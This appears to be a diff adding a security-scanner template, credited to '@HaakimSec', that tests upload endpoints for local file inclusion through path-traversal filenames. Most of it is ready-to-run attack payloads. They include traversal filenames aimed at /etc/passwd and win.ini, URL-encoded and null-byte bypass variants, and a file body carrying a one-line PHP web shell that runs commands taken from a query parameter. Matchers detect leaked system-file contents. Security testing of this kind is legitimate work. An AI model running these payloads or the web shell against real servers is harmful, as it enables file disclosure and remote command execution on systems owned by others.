@@ -1,0 +1,64 @@
+name: "LFI via File Upload Filename"
+description: "Tests for Local File Inclusion via path traversal in uploaded filenames"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "all"
+
+target:
+  endpoint: "/upload"
+  method: "POST"
+  param: "file"
+
+matchers-condition: or
+matchers:
+  - type: regex
+    part: body
+    regex:
+      - 'root:.*?:[0-9]*:[0-9]*:'
+      - 'daemon:.*?:[0-9]*:[0-9]*:'
+    condition: or
+  - type: word
+    part: body
+    words:
+      - 'for 16-bit app support'
+      - '[extensions]'
+    condition: or
+  - type: word
+    part: body
+    words:
+      - 'File uploaded'
+      - 'Upload successful'
+    condition: and
+  - type: status
+    status:
+      - 200
+      - 201
+
+extractors:
+  - type: regex
+    regex:
+      - 'path["\"]?\s*[:=]\s*["\"]?([^"\s]+\.\w+)'
+    name: uploaded_path
+    group: 1
+
+payloads:
+  - name: "Linux /etc/passwd traversal"
+    filename: "../../../../../../../../../../../../../../../etc/passwd"
+    extension: ".jpg"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["lfi", "path-traversal", "linux"]
+  - name: "Windows win.ini traversal"
+    filename: "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+    extension: ".txt"
+    body: "test"
+    tags: ["lfi", "path-traversal", "windows"]
+  - name: "URL-encoded traversal"
+    filename: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    extension: ".jpg"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["lfi", "url-encoded"]
+  - name: "Null byte bypass"
+    filename: "../../../../../../../../../../../../../../../etc/passwd%00.jpg"
+    extension: ".jpg"
+    body: "<?php system($_GET['cmd']); ?>"
+    tags: ["lfi", "null-byte"]
